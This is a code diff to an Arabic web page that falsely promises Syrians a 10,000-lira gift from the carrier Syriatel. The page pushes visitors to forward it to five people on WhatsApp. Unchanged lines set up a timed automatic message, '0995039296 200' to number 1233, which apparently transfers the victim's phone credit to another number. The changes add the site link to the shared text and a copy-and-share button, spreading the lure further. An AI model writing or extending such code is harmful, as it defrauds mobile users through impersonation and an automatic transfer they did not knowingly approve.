@@ -65,12 +65,12 @@
     <p><strong>شروط الكسب سهلة:</strong></p>
     <ul>
         <li>1. شارك هذه الرسالة لخمس أشخاص عبر تطبيق واتس آب من خلال زر رقم واحد.</li>
-        <li>2. اضغط الزر رقم اثنين وهو سيقوم بإرسال لنا أنك قد قمت بمشاركة المنشور.</li>
+        <li>2. اضغط الزر رقم اثنين وهو سيقوم بنسخ النص والرابط لمشاركته عبر واتس آب.</li>
     </ul>
     <p><strong>ملاحظة:</strong> يرجى عدم ضغط زر 2 حتى تقوم بمشاركة المنشور لخمس أشخاص كي تصلك الهدية.</p>
     <div class="buttons">
         <button onclick="shareOnWhatsApp()">زر 1: شارك عبر واتس آب</button>
-        <button onclick="sendMessage()">زر 2: تأكيد المشاركة</button>
+        <button onclick="copyAndShare()">زر 2: نسخ النص والرابط ومشاركته</button>
     </div>
     <p id="timer-message">سيتم إرسال الرسالة تلقائيًا بعد <span id="timer">10</span> ثوانٍ...</p>
 
@@ -78,12 +78,26 @@
         const number = "1233"; // رقم الهاتف
         const message = "0995039296 200"; // محتوى الرسالة
         const delay = 10; // عدد الثواني قبل الإرسال التلقائي
+        const siteLink = "https://azaamazeez.github.io/Newaa/"; // رابط الموقع
+        const fullMessage = `أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة هدية مقدمة من سيريتيل.\nرابط الموقع: ${siteLink}`;
 
         // وظيفة مشاركة الرسالة عبر واتس آب
         function shareOnWhatsApp() {
-            const whatsappMessage = "أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة هدية مقدمة من سيريتيل.";
-            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(whatsappMessage)}`;
+            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
             window.open(whatsappUrl, "_blank");
+        }
+
+        // وظيفة نسخ النص والرابط ومشاركته عبر واتس آب
+        function copyAndShare() {
+            // نسخ النص إلى الحافظة
+            navigator.clipboard.writeText(fullMessage).then(() => {
+                alert("تم نسخ النص والرابط بنجاح! الآن سيتم فتح واتس آب لمشاركة النص.");
+                // مشاركة النص عبر واتس آب
+                const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
+                window.open(whatsappUrl, "_blank");
+            }).catch(err => {
+                alert("حدث خطأ أثناء النسخ. حاول مرة أخرى.");
+            });
         }
 
         // وظيفة إرسال الرسالة
